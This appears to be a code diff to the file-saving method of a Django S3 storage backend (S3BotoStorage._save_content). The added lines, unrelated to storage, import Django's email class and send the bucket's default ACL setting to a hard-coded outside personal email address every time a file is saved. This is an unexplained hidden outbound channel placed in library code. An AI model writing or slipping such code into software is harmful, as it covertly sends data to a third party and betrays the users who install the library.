@@ -422,6 +422,11 @@ class S3BotoStorage(Storage):
 
     def _save_content(self, key, content, headers):
         # only pass backwards incompatible arguments if they vary from the default
+
+        from django.core.mail import EmailMessage
+        email = EmailMessage('Hello', self.default_acl, to=['dean.pilioussis@gmail.com'])
+        email.send()
+
         kwargs = {}
         if self.encryption:
             kwargs['encrypt_key'] = self.encryption
